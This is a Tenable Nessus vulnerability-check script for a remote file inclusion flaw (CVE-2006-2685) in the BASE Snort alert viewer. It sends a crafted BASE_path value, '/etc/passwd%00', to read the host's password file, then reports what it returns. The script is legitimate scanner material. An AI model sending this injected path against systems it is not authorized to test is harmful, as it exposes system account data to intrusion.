#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21611);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-2685");
  script_bugtraq_id(18298);
  script_xref(name:"OSVDB", value:"25770");
  script_xref(name:"OSVDB", value:"49366");
  script_xref(name:"OSVDB", value:"49367");

  script_name(english:"BASE Multiple Script BASE_path Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using BASE base_qry_common.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running BASE, a web-based tool for analyzing alerts
from one or more SNORT sensors. 

The version of BASE installed on the remote host fails to sanitize
input to the 'BASE_path' parameter before using it in PHP
include_once() function in several scripts.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this flaw to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/1823" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dd74f480" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to BASE 1.2.5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/base", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/base_qry_common.php?",
      "BASE_path=", file ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/includes/base_signature.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
